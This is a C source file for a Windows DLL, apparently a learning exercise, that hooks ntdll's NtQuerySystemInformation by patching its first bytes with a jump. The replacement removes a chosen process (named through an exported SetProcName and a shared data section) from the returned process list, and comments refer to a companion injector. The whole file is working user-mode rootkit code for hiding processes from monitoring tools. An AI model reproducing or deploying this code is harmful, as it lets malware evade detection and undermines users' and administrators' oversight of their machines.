#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <wchar.h>
#include <windows.h>

#define STATUS_SUCCESS						(0x00000000L) 
WCHAR* szNtdll = L"ntdll.dll";
CHAR* szNtQuerySystemInformatio = "NtQuerySystemInformation";

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;
typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    PVOID Reserved2[3];
    HANDLE UniqueProcessId;
    PVOID Reserved3;
    ULONG HandleCount;
    BYTE Reserved4[4];
    PVOID Reserved5[11];
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;
typedef long (WINAPI* tmy_ZwQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );



#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
WCHAR g_szProcName[MAX_PATH] = { 0, };
#pragma data_seg()
BYTE lp_OrgAsm[8] = { 0, };

//解决jmp形call
BYTE* getReallCall(BYTE* lp)
{
    return  *(DWORD*)(lp + 1) + (BYTE*)lp + 5;
}

/*
*函数名: hook_by_code
*函数参数:
*   参数1: WCHAR* szDllName 目标函数所在dll名字
*   参数2: CHAR* szFuncName 目标函数的名字
*   参数3: PROC pfnNew 目标函数替换函数的地址
*   参数4: BYTE* pOrgAsm 用于存储目标函数的开头的字节码 此刻是写入
* 函数功能:
*   挂钩
*/

BOOL hook_by_code(WCHAR* szDllName, CHAR* szFuncName, PROC pfnNew, BYTE* pOrgAsm)
{
    FARPROC lp_org_NtQuerySystemInformation;
    DWORD dwOldProtect, dwAddress;
    BYTE pBuf[5] = { 0xE9, 0, };
    BYTE* pByte;

    lp_org_NtQuerySystemInformation = (FARPROC)GetProcAddress(GetModuleHandleW(szDllName), szFuncName);//加载ZwQuerySystemInformation
    pByte = (PBYTE)lp_org_NtQuerySystemInformation;

    if (pByte[0] == 0xE9) 
    {
        //一开始就是jmp,说明已经被钩取了
        return FALSE;
    }
    VirtualProtect((LPVOID)lp_org_NtQuerySystemInformation, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    memcpy(pOrgAsm, lp_org_NtQuerySystemInformation, 5);
    dwAddress = (DWORD64)pfnNew - ((DWORD64)lp_org_NtQuerySystemInformation + 5);//获取的是一个地址,而不是具体的汇编字节代码哟
    //jmp xxxx 它这里就是在计算那个xx值
    memcpy(&pBuf[1], &dwAddress, 4);
    memcpy(lp_org_NtQuerySystemInformation, pBuf, 5);//把jmp xx 写入 API中
    VirtualProtect((LPVOID)lp_org_NtQuerySystemInformation, 5, dwOldProtect, &dwOldProtect);

    return TRUE;
}

/*
*函数名: unhook_by_code
*函数参数:
*   参数1: WCHAR* szDllName 目标函数所在dll名字
*   参数2: CHAR* szFuncName 目标函数的名字
*   参数3: BYTE* pOrgAsm 用于存储目标函数的开头的字节码 此刻是读取
* 函数功能:
*   脱钩
*/
BOOL unhook_by_code(WCHAR* szDllName, CHAR* szFuncName, PBYTE pOrgBytes)
{
    FARPROC pFunc;
    DWORD dwOldProtect;
    PBYTE pByte;

    pFunc = GetProcAddress(GetModuleHandleW(szDllName), szFuncName);
    pByte = (PBYTE)pFunc;


    if (pByte[0] != 0xE9)//如果已经脱钩了,不再脱了
    {
        return FALSE;
    }

    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    memcpy(pFunc, pOrgBytes, 5);
    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

    return TRUE;
}


NTSTATUS WINAPI my_NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS status;
    FARPROC pFunc;
    PSYSTEM_PROCESS_INFORMATION lp_LinkHead, lp_Link_old=0;
    char szProcName[MAX_PATH] = { 0, };

    //脱钩,因为后面我们要调用NtQuerySystemInformatio.. 否则无法正常调用
    unhook_by_code(szNtdll, szNtQuerySystemInformatio, lp_OrgAsm);

    pFunc = GetProcAddress(GetModuleHandleW(szNtdll), szNtQuerySystemInformatio);
    status = ((tmy_ZwQuerySystemInformation)pFunc)(SystemInformationClass, SystemInformation,SystemInformationLength, ReturnLength);
    //先实际上调用一遍 原始的NtQuerySystemInformation

    if (status != STATUS_SUCCESS)
    {
        goto __NTQUERYSYSTEMINFORMATION_END;//这个分支不太明白
    }

    if (SystemInformationClass == SystemProcessInformation)
    {

        lp_LinkHead = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

        while (TRUE)
        {
            if (lp_LinkHead->Reserved2[1] != NULL)
            {
                if (!_wcsicmp((WCHAR*)lp_LinkHead->Reserved2[1], g_szProcName))
                {
                    if (lp_LinkHead->NextEntryOffset == 0)
                    {
                        lp_Link_old->NextEntryOffset = 0;
                    }
                    else
                    {
                        lp_Link_old->NextEntryOffset += lp_LinkHead->NextEntryOffset;
                    }
                }
                else
                {
                    lp_Link_old = lp_LinkHead;
                }
            }

            if (lp_LinkHead->NextEntryOffset == 0)
            {
                break;
            }
            lp_LinkHead = (PSYSTEM_PROCESS_INFORMATION) ((DWORD64)lp_LinkHead + lp_LinkHead->NextEntryOffset);
        }
    }

__NTQUERYSYSTEMINFORMATION_END:

    //对NtQuerySystemInformatio挂钩
    hook_by_code(szNtdll,szNtQuerySystemInformatio,(PROC)my_NtQuerySystemInformation, lp_OrgAsm);

    return status;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    WCHAR szCurProc[MAX_PATH] = { 0, };
    WCHAR* p = NULL;

    GetModuleFileNameW(NULL, szCurProc, sizeof(szCurProc));
    p = wcsrchr(szCurProc, L'\\');
    if ((p != NULL) && !_wcsicmp(p + 1, L"C.exe"))//如果当前进程是HideProc.exe 就... 
    {
        return TRUE;
        //HideProc.exe是我们自己,也就是注入器
    }

    switch (fdwReason)
    {
        // #2. API Hooking
    case DLL_PROCESS_ATTACH:
        hook_by_code(szNtdll, szNtQuerySystemInformatio,(PROC)getReallCall(my_NtQuerySystemInformation), lp_OrgAsm);
        break;
        // #3. API Unhooking 
    case DLL_PROCESS_DETACH:
        unhook_by_code(szNtdll, szNtQuerySystemInformatio,lp_OrgAsm);
        break;
    }
    return TRUE;
}


#ifdef __cplusplus
extern "C" {
#endif
    __declspec(dllexport) void SetProcName(WCHAR* szProcName)
    {
        wcscpy(g_szProcName, szProcName);
    }
#ifdef __cplusplus
}
#endif

//象征性的插入一个dll
#ifdef __cplusplus
extern "C" {
#endif
    __declspec(dllexport) void funny() //形式上的导出函数
    {
        return;
    }
#ifdef __cplusplus
}
#endif